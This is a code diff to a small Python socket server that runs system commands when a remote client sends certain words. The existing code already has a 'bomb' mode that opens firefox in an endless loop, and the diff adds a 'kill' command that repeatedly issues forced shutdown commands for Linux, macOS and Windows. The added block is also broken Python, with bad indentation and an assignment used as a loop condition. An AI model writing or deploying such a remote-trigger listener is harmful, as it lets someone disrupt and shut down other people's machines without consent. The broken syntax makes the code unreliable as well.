@@ -5,6 +5,7 @@ import sys
 import subprocess
 
 bomb = False
+kill = False
 
 def goto(line) :
   global lineNumber
@@ -18,6 +19,7 @@ HOST = '0.0.0.0'
 def handle(clientsocket):
   while True:
     buf = clientsocket.recv(MAX_LENGTH).decode("utf-8")
+    print('Connected')
     if buf == '': return #client terminated connection
     #buf = buf.decode("utf-8")
     try:
@@ -32,7 +34,24 @@ def handle(clientsocket):
         bomb = True
         while bomb == True:
             os.system('firefox')
-
+    if buf == 'kill':
+        kill = True
+          while kill = True:
+              try:
+                  print('Trying Linux Kill')
+                  os.system('shutdown now')
+              except:
+                  print('Linux Kill failed')
+              try:
+                  print('Trying Mac-OS Kill')
+                  os.system('sudo shutdown -h now')
+              except:
+                  print('Mac-OS Kill failed')
+              try:
+                  print('Trying Windows Kill')
+                  os.system('shutdown /s /f')
+              except:
+                  print('Windows Kill failed')
 
 serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
